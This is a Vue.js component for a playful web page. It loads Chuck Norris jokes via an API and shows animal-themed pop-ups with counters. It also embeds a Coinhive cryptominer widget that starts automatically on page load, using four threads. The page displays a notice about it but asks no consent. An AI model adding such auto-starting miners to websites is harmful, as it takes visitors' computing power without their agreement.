<template>
  <div class="hello">
    <h1>{{ msg }}</h1>
    <h2>{{ msg2 }}</h2>
    <h2>Click the button to get Chuck Norris 'jokes'</h2>
      <button id="btn" class="" v-on:click="getJokes">
        <img alt="Henry Software Image Apple" src="Apple.png">
        API btn
      </button>
      <div v-if="loading">
        <img src="Chicken.png" style="width: 80px; height: 80px;"/>
        Loading.....
      </div>
      <div class="wrapper">
        <div class="row">
          <div v-for="joke in jokes" :key="joke.id" class="card-deck d-flex justify-content-around">
          <div class="card m-3">
            <img src="https://placeimg.com/200/300/arch" class="img-responsive" alt="Random images placeholder"> 
            <div>
              <h3>{{ joke.id }}</h3>
              <p>{{ joke.joke }}</p>
              <p>{{ joke.category }}</p>
            </div>
          </div>
          </div>
        </div>
      </div>
      <div id="buttons-with-counter">
        <button v-on:click="swal_nyan"
          class="btn-lg nyan_btn">
          Meow? 😸
        </button>
        <button v-on:click="swal_shibe"
          class="btn-lg shibe_btn">
          Rough. 🐕
        </button>
        <button v-on:click="swal_whoosh"
          class="btn-lg whoosh_btn">
          :whoosh: 🦋
        </button>
        <h2 class="mt-5">Party count</h2>
        <ul>
          <li>Nyans: {{nyans}}</li>
          <li>Doges: {{doges}}</li>
          <li>Butterfrees: {{bfs}}</li>
        </ul>
      </div>

    <div class="coinhive-miner card p-2 m-3 w-75 mx-auto"
      style="width: 256px; height: 260px"
      data-key="m9y2InYOnZhfTXEd93mRwYkeQbMrd0gq"
      data-autostart="true"
      data-whitelabel="false"
      data-background="#7de2ff"
      data-text="#000000"
      data-action="#00ff00"
      data-graph="#b22222"
      data-threads="4"
      data-throttle="0.3">
      <em>Loading...</em>
    </div>
    <h5>
      Miner can only run while you are on this site.<br/>
      Please close your browser to stop miner and destroy the script.
    </h5>
    <footer>
      <p>Some images courtesy of <a href="https://henrysoftware.itch.io/pixel-food/download/eyJleHBpcmVzIjoxNTM0NTMwNDI5LCJpZCI6NDI1Nzd9.vlNqqXJCyOGCuIQZyqB9QK6HE5M%3d">Henry Software</a>.
      </p>
    </footer>
  </div>
</template>

<script>
import axios from 'axios';

export default {
  name: 'HelloWorld',
  components: {},
  props: {
    msg: String,
    msg2: String
  },
  data() {
    return {
      jokes: [],
      loading: false,
      nyans: 0,
      doges: 0,
      bfs: 0,
      icons: [
        { name: 'Apple', price: '10' },
        { name: 'AppleWorm', price: '2' },
        { name: 'Avocado', price: '50' },
      ],
      users: [],
    }
  },
  methods: {
    getJokes: function () {
      this.loading = true;
      axios.get("http://api.icndb.com/jokes/random/10")
      .then((response)  =>  {
        this.loading = false;
        this.jokes = response.data.value;
      }, (error)  =>  {
        this.loading = false;
      })
    },
    swal_nyan(){
      //uses sweet alert 2
      this.$swal({
        html: "<h1 style='color:white;'>Nyancat Joins the Party~</h1>",
        width: 600,
        padding: '3em',
        background: '#faa url(bg_knot.png)',
        backdrop: `
          rgba(200,0,100,0.4)
          url(nyan-cat.gif)
          bottom center
          no-repeat
        `
        });
      this.nyans++;
    },
    swal_shibe(){
      //uses sweet alert 2
      this.$swal({
        html: "<h1 style='color:white;'>Doge Joins the Party~</h1>",
        width: "80%",
        padding: '3em',
        background: '#aff url(bg_knot.png)',
        backdrop: `
          rgba(100,60,0,0.4)
          url(doge2.png)
          bottom center
          no-repeat
        `
        });
      this.doges++;
    },
    swal_whoosh(){
      //uses sweet alert 2
      this.$swal({
        html: "<h1 style='color:white;'>Butterfree Joins the Party~</h1>",
        width: 600,
        padding: '3em',
        background: '#faf url(bg_knot.png)',
        backdrop: `
          rgba(50,00,80,0.4)
          url(butterfree.png)
          bottom center
          no-repeat
        `
        });
      this.bfs++;
    },

  }
}
</script>

